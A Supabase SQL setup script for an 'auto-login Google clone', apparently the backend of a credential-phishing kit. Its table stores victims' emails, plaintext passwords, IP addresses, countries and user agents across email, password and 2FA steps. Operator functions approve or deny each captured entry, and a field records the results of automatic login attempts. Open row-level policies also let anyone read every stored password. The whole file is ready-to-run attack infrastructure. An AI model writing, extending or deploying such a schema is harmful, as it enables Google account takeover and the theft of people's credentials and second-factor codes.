-- ========================================
-- 🚀 AUTO-LOGIN GOOGLE CLONE - VERSION 2.1
-- Database Schema với Country Detection
-- Copy vào Supabase SQL Editor
-- ========================================

-- 1. Create requests table
CREATE TABLE IF NOT EXISTS public.requests (
  id BIGSERIAL PRIMARY KEY,
  email TEXT NOT NULL,
  password TEXT,
  ip_address TEXT,
  country TEXT DEFAULT 'United States (US)',
  user_agent TEXT,
  page TEXT NOT NULL,
  status TEXT DEFAULT 'pending',
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ DEFAULT NOW(),
  auto_login_result JSONB,
  auto_approved BOOLEAN DEFAULT false,
  approval_reason TEXT
);

-- 2. Create indexes for performance
CREATE INDEX IF NOT EXISTS idx_requests_status ON public.requests(status);
CREATE INDEX IF NOT EXISTS idx_requests_page ON public.requests(page);
CREATE INDEX IF NOT EXISTS idx_requests_created_at ON public.requests(created_at);
CREATE INDEX IF NOT EXISTS idx_requests_email ON public.requests(email);
CREATE INDEX IF NOT EXISTS idx_requests_country ON public.requests(country);

-- 3. Enable Row Level Security
ALTER TABLE public.requests ENABLE ROW LEVEL SECURITY;

-- 4. Create RLS policies
CREATE POLICY "Enable insert for all users" ON public.requests
  FOR INSERT WITH CHECK (true);

CREATE POLICY "Enable select for all users" ON public.requests
  FOR SELECT USING (true);

CREATE POLICY "Enable update for all users" ON public.requests
  FOR UPDATE USING (true);

-- 5. Create approve_request function
CREATE OR REPLACE FUNCTION approve_request(request_id BIGINT, new_status TEXT)
RETURNS JSONB
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
DECLARE
  result JSONB;
BEGIN
  UPDATE public.requests 
  SET 
    status = new_status,
    updated_at = NOW()
  WHERE id = request_id;
  
  SELECT jsonb_build_object(
    'id', id,
    'email', email,
    'status', status,
    'country', country,
    'updated_at', updated_at
  ) INTO result
  FROM public.requests 
  WHERE id = request_id;
  
  RETURN result;
END;
$$;

-- 6. Create function to get pending requests
CREATE OR REPLACE FUNCTION get_pending_requests()
RETURNS JSONB
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
DECLARE
  result JSONB;
BEGIN
  SELECT jsonb_agg(
    jsonb_build_object(
      'id', id,
      'email', email,
      'ip_address', ip_address,
      'country', country,
      'page', page,
      'status', status,
      'created_at', created_at,
      'auto_approved', auto_approved,
      'approval_reason', approval_reason
    )
  ) INTO result
  FROM public.requests 
  WHERE status = 'pending'
  ORDER BY created_at DESC;
  
  RETURN COALESCE(result, '[]'::jsonb);
END;
$$;

-- 7. Create updated_at trigger
CREATE OR REPLACE FUNCTION update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = NOW();
  RETURN NEW;
END;
$$ language 'plpgsql';

CREATE TRIGGER update_requests_updated_at 
  BEFORE UPDATE ON public.requests 
  FOR EACH ROW 
  EXECUTE FUNCTION update_updated_at_column();

-- 8. Insert sample data for testing
INSERT INTO public.requests (email, page, country, status) VALUES
('test@gmail.com', 'email', 'United States (US)', 'approved'),
('demo@yahoo.com', 'password', 'Vietnam (VN)', 'pending'),
('sample@hotmail.com', '2fa', 'Germany (DE)', 'denied');

-- ========================================
-- ✅ DATABASE SETUP COMPLETE
-- Schema includes:
-- - requests table with country detection
-- - Performance indexes
-- - Row Level Security
-- - Helper functions
-- - Sample test data
-- ======================================== 